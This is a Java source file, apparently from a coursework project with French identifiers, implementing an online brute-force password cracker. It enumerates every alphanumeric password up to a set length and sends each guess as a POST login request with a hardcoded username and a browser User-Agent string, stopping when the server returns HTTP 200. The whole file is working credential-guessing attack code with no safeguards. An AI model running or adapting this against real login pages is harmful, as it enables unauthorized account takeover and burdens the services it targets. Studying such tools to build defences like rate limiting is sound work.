import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

class OnlineBruteForce extends BruteForce{
    private static long index = 0;
    private static final String USER_AGENT = "Mozilla/5.0";
    public void crack(String urlSite) {
        
        
        String username = "hamid";
        int k = 1;
        
    
        String serveur = Outils.getServeur(urlSite);
        HttpURLConnection connection = null;
    
        try {
            URL url = new URL(serveur);
                long start = System.currentTimeMillis();
                while (k <= nombreDeCaractereMax) {
                    index = 0; 
                    String nextWord = genererMotDePasse(k);
                    while (nextWord != null) {
                        String postParams = "username=" + username + "&password=" + nextWord;
                        System.out.println("essai avec :" + nextWord);
                        connection = (HttpURLConnection) url.openConnection();
                        connection.setRequestMethod("POST");
                        connection.setRequestProperty("User-Agent", USER_AGENT);
                        connection.setDoOutput(true);
    
                        try (OutputStream os = connection.getOutputStream()) {
                            os.write(postParams.getBytes());
                            os.flush();
                        }
    
                        int responseCode = connection.getResponseCode();
    
                        if (responseCode == HttpURLConnection.HTTP_OK) {
                            System.out.println("Mot de passe Trouve "+nextWord);
                            Outils.afficherTemps(System.currentTimeMillis() - start);
                            return;
                        }
                        nextWord = genererMotDePasse(k);
                    }
                    k++;
                }
        } catch (IOException e) {
            System.err.println("Erreur de lecture du fichier : " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    
    }

    public static String genererMotDePasse(int nombreDeCaractereMax) {
        if (index >= Math.pow(alphaNumerique.length, nombreDeCaractereMax)) {
            return null; 
        }

        StringBuilder motCourant = new StringBuilder();
        long remainder = index;

        for (int i = 0; i < nombreDeCaractereMax; i++) {
            int characterIndex = (int)(remainder % alphaNumerique.length);
            motCourant.insert(0, alphaNumerique[characterIndex]);
            remainder /= alphaNumerique.length;
        }

        index++;
        return motCourant.toString();
    }
}